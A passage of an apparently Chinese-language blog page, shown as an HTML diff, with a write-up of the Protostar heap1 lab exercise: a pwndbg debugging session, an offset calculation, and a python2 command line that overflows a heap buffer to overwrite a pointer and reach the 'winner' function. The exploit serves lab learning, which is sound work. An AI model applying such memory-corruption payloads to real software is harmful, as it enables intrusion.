+<span class="w">   </span><span class="mh">0x08048561</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">168</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">call</span><span class="w">   </span><span class="mh">0x80483cc</span><span class="w"> </span><span class="o">&lt;</span><span class="n">puts</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">   </span><span class="mh">0x08048566</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">173</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">leave</span>
+<span class="w">   </span><span class="mh">0x08048567</span><span class="w"> </span><span class="o">&lt;+</span><span class="mi">174</span><span class="o">&gt;:</span><span class="w">   </span><span class="n">ret</span>
+<span class="n">End</span><span class="w"> </span><span class="n">of</span><span class="w"> </span><span class="n">assembler</span><span class="w"> </span><span class="n">dump</span><span class="p">.</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">b</span><span class="w"> </span><span class="o">*</span><span class="n">main</span><span class="o">+</span><span class="mi">127</span>
+<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="mh">0x8048538</span><span class="o">:</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">heap1</span><span class="o">/</span><span class="n">heap1</span><span class="p">.</span><span class="n">c</span><span class="p">,</span><span class="w"> </span><span class="n">line</span><span class="w"> </span><span class="mf">31.</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">run</span><span class="w"> </span><span class="n">AAAA</span><span class="w"> </span><span class="n">BBBB</span>
+<span class="n">Starting</span><span class="w"> </span><span class="n">program</span><span class="o">:</span><span class="w"> </span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="n">bin</span><span class="o">/</span><span class="n">heap1</span><span class="w"> </span><span class="n">AAAA</span><span class="w"> </span><span class="n">BBBB</span>
+<span class="p">[</span><span class="n">Thread</span><span class="w"> </span><span class="n">debugging</span><span class="w"> </span><span class="n">using</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">enabled</span><span class="p">]</span>
+<span class="n">Using</span><span class="w"> </span><span class="n">host</span><span class="w"> </span><span class="n">libthread_db</span><span class="w"> </span><span class="n">library</span><span class="w"> </span><span class="s">&quot;/lib/x86_64-linux-gnu/libthread_db.so.1&quot;</span><span class="p">.</span>
+
+<span class="n">Breakpoint</span><span class="w"> </span><span class="mi">1</span><span class="p">,</span><span class="w"> </span><span class="mh">0x08048538</span><span class="w"> </span><span class="n">in</span><span class="w"> </span><span class="n">main</span><span class="w"> </span><span class="p">(</span><span class="n">argc</span><span class="o">=</span><span class="mi">3</span><span class="p">,</span><span class="w"> </span><span class="n">argv</span><span class="o">=</span><span class="mh">0xffffcf54</span><span class="p">)</span><span class="w"> </span><span class="n">at</span><span class="w"> </span><span class="n">heap1</span><span class="o">/</span><span class="n">heap1</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="mi">31</span>
+<span class="nl">warning</span><span class="p">:</span><span class="w"> </span><span class="mi">31</span><span class="w">     </span><span class="n">heap1</span><span class="o">/</span><span class="n">heap1</span><span class="p">.</span><span class="n">c</span><span class="o">:</span><span class="w"> </span><span class="n">No</span><span class="w"> </span><span class="n">such</span><span class="w"> </span><span class="n">file</span><span class="w"> </span><span class="n">or</span><span class="w"> </span><span class="n">directory</span>
+<span class="nl">LEGEND</span><span class="p">:</span><span class="w"> </span><span class="n">STACK</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">HEAP</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">CODE</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">DATA</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">WX</span><span class="w"> </span><span class="o">|</span><span class="w"> </span><span class="n">RODATA</span>
+<span class="err">─────────────────────────────────────────────────────</span><span class="p">[</span><span class="w"> </span><span class="n">REGISTERS</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">show</span><span class="o">-</span><span class="n">flags</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">show</span><span class="o">-</span><span class="n">compact</span><span class="o">-</span><span class="n">regs</span><span class="w"> </span><span class="n">off</span><span class="w"> </span><span class="p">]</span><span class="err">─────────────────────────────────────────────────────</span>
+<span class="w"> </span><span class="n">EAX</span><span class="w">  </span><span class="mh">0x804a1b0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="w"> </span><span class="n">EBX</span><span class="w">  </span><span class="mh">0xf7f95e14</span><span class="w"> </span><span class="p">(</span><span class="n">_GLOBAL_OFFSET_TABLE_</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mh">0x232d0c</span><span class="w"> </span><span class="cm">/* &#39;\x0c-#&#39; */</span>
+<span class="w"> </span><span class="n">ECX</span><span class="w">  </span><span class="mi">0</span>
+<span class="w"> </span><span class="n">EDX</span><span class="w">  </span><span class="mh">0xffffd159</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="err">&#39;</span><span class="n">AAAA</span><span class="err">&#39;</span>
+<span class="w"> </span><span class="n">EDI</span><span class="w">  </span><span class="mh">0xf7ffcb60</span><span class="w"> </span><span class="p">(</span><span class="n">_rtld_global_ro</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="w"> </span><span class="n">ESI</span><span class="w">  </span><span class="mh">0x8048580</span><span class="w"> </span><span class="p">(</span><span class="n">__libc_csu_init</span><span class="p">)</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="n">push</span><span class="w"> </span><span class="n">ebp</span>
+<span class="w"> </span><span class="n">EBP</span><span class="w">  </span><span class="mh">0xffffce98</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="w"> </span><span class="n">ESP</span><span class="w">  </span><span class="mh">0xffffce70</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x804a1b0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="w"> </span><span class="n">EIP</span><span class="w">  </span><span class="mh">0x8048538</span><span class="w"> </span><span class="p">(</span><span class="n">main</span><span class="o">+</span><span class="mi">127</span><span class="p">)</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0xfffe4fe8</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="err">───────────────────────────────────────────────────────────────</span><span class="p">[</span><span class="w"> </span><span class="n">DISASM</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">i386</span><span class="w"> </span><span class="o">/</span><span class="w"> </span><span class="n">set</span><span class="w"> </span><span class="n">emulate</span><span class="w"> </span><span class="n">on</span><span class="w"> </span><span class="p">]</span><span class="err">───────────────────────────────────────────────────────────────</span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="mh">0x8048538</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">127</span><span class="o">&gt;</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="w">                  </span><span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+<span class="w">        </span><span class="nl">dest</span><span class="p">:</span><span class="w"> </span><span class="mh">0x804a1b0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="w">        </span><span class="nl">src</span><span class="p">:</span><span class="w"> </span><span class="mh">0xffffd159</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="err">&#39;</span><span class="n">AAAA</span><span class="err">&#39;</span>
+
+<span class="w">   </span><span class="mh">0x804853d</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">132</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">ebp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0xc</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x8048540</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">135</span><span class="o">&gt;</span><span class="w">    </span><span class="n">add</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="mi">8</span>
+<span class="w">   </span><span class="mh">0x8048543</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">138</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x8048545</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">140</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">edx</span><span class="p">,</span><span class="w"> </span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x8048547</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">142</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mh">0x18</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x804854b</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">146</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">eax</span><span class="p">,</span><span class="w"> </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">eax</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">]</span>
+<span class="w">   </span><span class="mh">0x804854e</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">149</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="p">],</span><span class="w"> </span><span class="n">edx</span>
+<span class="w">   </span><span class="mh">0x8048552</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">153</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="w"> </span><span class="n">eax</span>
+<span class="w">   </span><span class="mh">0x8048555</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">156</span><span class="o">&gt;</span><span class="w">    </span><span class="n">call</span><span class="w">   </span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="w">                  </span><span class="o">&lt;</span><span class="n">strcpy</span><span class="err">@</span><span class="n">plt</span><span class="o">&gt;</span>
+
+<span class="w">   </span><span class="mh">0x804855a</span><span class="w"> </span><span class="o">&lt;</span><span class="n">main</span><span class="o">+</span><span class="mi">161</span><span class="o">&gt;</span><span class="w">    </span><span class="n">mov</span><span class="w">    </span><span class="n">dword</span><span class="w"> </span><span class="n">ptr</span><span class="w"> </span><span class="p">[</span><span class="n">esp</span><span class="p">],</span><span class="w"> </span><span class="mh">0x804864b</span>
+<span class="err">───────────────────────────────────────────────────────────────────────────</span><span class="p">[</span><span class="w"> </span><span class="n">STACK</span><span class="w"> </span><span class="p">]</span><span class="err">────────────────────────────────────────────────────────────────────────────</span>
+<span class="mo">00</span><span class="o">:</span><span class="mo">0000</span><span class="err">│</span><span class="w"> </span><span class="n">esp</span><span class="w"> </span><span class="mh">0xffffce70</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x804a1b0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="mo">01</span><span class="o">:</span><span class="mo">0004</span><span class="err">│</span><span class="mo">-024</span><span class="w"> </span><span class="mh">0xffffce74</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0xffffd159</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="err">&#39;</span><span class="n">AAAA</span><span class="err">&#39;</span>
+<span class="mo">02</span><span class="o">:</span><span class="mo">000</span><span class="mi">8</span><span class="err">│</span><span class="mo">-020</span><span class="w"> </span><span class="mh">0xffffce78</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="p">...</span><span class="w"> </span><span class="err">↓</span><span class="w">        </span><span class="mi">2</span><span class="w"> </span><span class="n">skipped</span>
+<span class="mo">05</span><span class="o">:</span><span class="mo">0014</span><span class="err">│</span><span class="mo">-014</span><span class="w"> </span><span class="mh">0xffffce84</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x804a1a0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">1</span>
+<span class="mo">06</span><span class="o">:</span><span class="mo">001</span><span class="mi">8</span><span class="err">│</span><span class="mo">-010</span><span class="w"> </span><span class="mh">0xffffce88</span><span class="w"> </span><span class="err">—▸</span><span class="w"> </span><span class="mh">0x804a1c0</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">2</span>
+<span class="mo">07</span><span class="o">:</span><span class="mo">001</span><span class="n">c</span><span class="err">│</span><span class="mo">-00</span><span class="n">c</span><span class="w"> </span><span class="mh">0xffffce8c</span><span class="w"> </span><span class="err">◂—</span><span class="w"> </span><span class="mi">0</span>
+<span class="err">─────────────────────────────────────────────────────────────────────────</span><span class="p">[</span><span class="w"> </span><span class="n">BACKTRACE</span><span class="w"> </span><span class="p">]</span><span class="err">──────────────────────────────────────────────────────────────────────────</span>
+<span class="w"> </span><span class="err">►</span><span class="w"> </span><span class="mi">0</span><span class="w"> </span><span class="mh">0x8048538</span><span class="w"> </span><span class="n">main</span><span class="o">+</span><span class="mi">127</span>
+<span class="w">   </span><span class="mi">1</span><span class="w"> </span><span class="mh">0xf7d87cc3</span><span class="w"> </span><span class="n">__libc_start_call_main</span><span class="o">+</span><span class="mi">115</span>
+<span class="w">   </span><span class="mi">2</span><span class="w"> </span><span class="mh">0xf7d87d88</span><span class="w"> </span><span class="n">__libc_start_main</span><span class="o">+</span><span class="mi">136</span>
+<span class="w">   </span><span class="mi">3</span><span class="w"> </span><span class="mh">0x8048401</span><span class="w"> </span><span class="n">_start</span><span class="o">+</span><span class="mi">33</span>
+<span class="err">────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────────</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">x</span><span class="o">/</span><span class="n">wx</span><span class="w"> </span><span class="n">$esp</span>
+<span class="mh">0xffffce70</span><span class="o">:</span><span class="w">     </span><span class="mh">0x0804a1b0</span>
+<span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">p</span><span class="o">/</span><span class="n">x</span><span class="w"> </span><span class="n">$eax</span>
+<span class="n">$1</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x804a1b0</span>
+</code></pre></div></p>
+<p><strong>代码刚执行完<code>mov    DWORD PTR [esp],eax</code>,执行停在第一次strcmp之前， 此时esp的地址（或者eax的地址）就是chunka的起始地址：0x804a1b0</strong></p>
+<hr />
+<p><strong>继续，我们需要获取到p2的起始地址：</strong>
+<div class="highlight"><pre><span></span><code><span class="n">pwndbg</span><span class="o">&gt;</span><span class="w"> </span><span class="n">x</span><span class="o">/</span><span class="n">wx</span><span class="w"> </span><span class="n">$esp</span><span class="o">+</span><span class="mh">0x18</span>
+<span class="mh">0xffffce88</span><span class="o">:</span><span class="w">     </span><span class="mh">0x0804a1c0</span>
+</code></pre></div></p>
+<hr />
+<p><strong>计算偏移</strong>
+<div class="highlight"><pre><span></span><code><span class="n">p2</span><span class="p">[</span><span class="mi">1</span><span class="p">]</span><span class="w"> </span><span class="n">地址</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="n">p2</span><span class="w"> </span><span class="n">起始地址</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0804a1c0</span><span class="w"> </span><span class="o">+</span><span class="w"> </span><span class="mi">4</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x0804a1c4</span>
+
+<span class="n">而chunka的起始地址为</span><span class="err">：</span><span class="mh">0x804a1b0</span>
+
+<span class="n">所以需要的偏移为</span><span class="err">：</span><span class="mh">0x0804a1c4</span><span class="w"> </span><span class="o">-</span><span class="w"> </span><span class="mh">0x804a1b0</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mh">0x14</span><span class="w"> </span><span class="o">=</span><span class="w"> </span><span class="mi">20</span>
+</code></pre></div></p>
+<p><strong>执行结果如下：</strong>
+<div class="highlight"><pre><span></span><code><span class="err">└─$</span> <span class="o">./</span><span class="n">heap1</span> <span class="err">$</span><span class="p">(</span><span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print &#39;A&#39;*20 + &#39;</span><span class="se">\x74\x97\x04\x08</span><span class="s2">&#39;&quot;</span><span class="p">)</span> <span class="err">$</span><span class="p">(</span><span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print &#39;</span><span class="se">\x94\x84\x04\x08</span><span class="s2">&#39;&quot;</span><span class="p">)</span>
+<span class="ow">and</span> <span class="n">we</span> <span class="n">have</span> <span class="n">a</span> <span class="n">winner</span> <span class="o">@</span> <span class="mi">1757928812</span>
+
+<span class="err">┌──</span><span class="p">(</span><span class="n">kali</span><span class="err">㉿</span><span class="n">kali</span><span class="p">)</span><span class="o">-</span><span class="p">[</span><span class="o">/</span><span class="n">opt</span><span class="o">/</span><span class="n">protostar</span><span class="o">/</span><span class="nb">bin</span><span class="p">]</span>
+<span class="err">└─$</span> <span class="o">./</span><span class="n">heap1</span> <span class="err">`</span><span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print &#39;A&#39;*20 + &#39;</span><span class="se">\x74\x97\x04\x08</span><span class="s2">&#39;&quot;</span><span class="err">`</span>  <span class="err">`</span><span class="n">python2</span> <span class="o">-</span><span class="n">c</span> <span class="s2">&quot;print &#39;</span><span class="se">\x94\x84\x04\x08</span><span class="s2">&#39;&quot;</span><span class="err">`</span>
+<span class="ow">and</span> <span class="n">we</span> <span class="n">have</span> <span class="n">a</span> <span class="n">winner</span> <span class="o">@</span> <span class="mi">1757928839</span>
+</code></pre></div>
+<img alt="image.png" src="https://raw.gitmirror.com/DarkLord-W/CloudImages/main/images/20250915173422840.png" /></p>
+
+
+
+
+
+
+
+
+
+
+
+
+                
+              </article>
+            </div>
+          
+          
+<script>var target=document.getElementById(location.hash.slice(1));target&&target.name&&(target.checked=target.name.startsWith("__tabbed_"))</script>
+        </div>
+        
+      </main>
+      
+        <footer class="md-footer">
+  
+  <div class="md-footer-meta md-typeset">
+    <div class="md-footer-meta__inner md-grid">
+      <div class="md-copyright">
+  
+  
+</div>
+      
+    </div>
+  </div>
+</footer>
+      
+    </div>
+    <div class="md-dialog" data-md-component="dialog">
+      <div class="md-dialog__inner md-typeset"></div>
+    </div>
+    
+    
+    
+      
+      <script id="__config" type="application/json">{"base": "../..", "features": [], "search": "../../assets/javascripts/workers/search.973d3a69.min.js", "tags": null, "translations": {"clipboard.copied": "Copied to clipboard", "clipboard.copy": "Copy to clipboard", "search.result.more.one": "1 more on this page", "search.result.more.other": "# more on this page", "search.result.none": "No matching documents", "search.result.one": "1 matching document", "search.result.other": "# matching documents", "search.result.placeholder": "Type to start searching", "search.result.term.missing": "Missing", "select.version": "Select version"}, "version": null}</script>
+    
+    
+      <script src="../../assets/javascripts/bundle.f55a23d4.min.js"></script>
+      
+        <script src="../../javascripts/mathjax.js"></script>
+      
+        <script src="https://polyfill.io/v3/polyfill.min.js?features=es6"></script>
+      
+        <script src="https://cdn.jsdelivr.net/npm/mathjax@3/es5/tex-mml-chtml.js"></script>
+      
+        <script src="https://unpkg.com/mermaid/dist/mermaid.min.js"></script>
+      
+    
+  </body>
+</html>
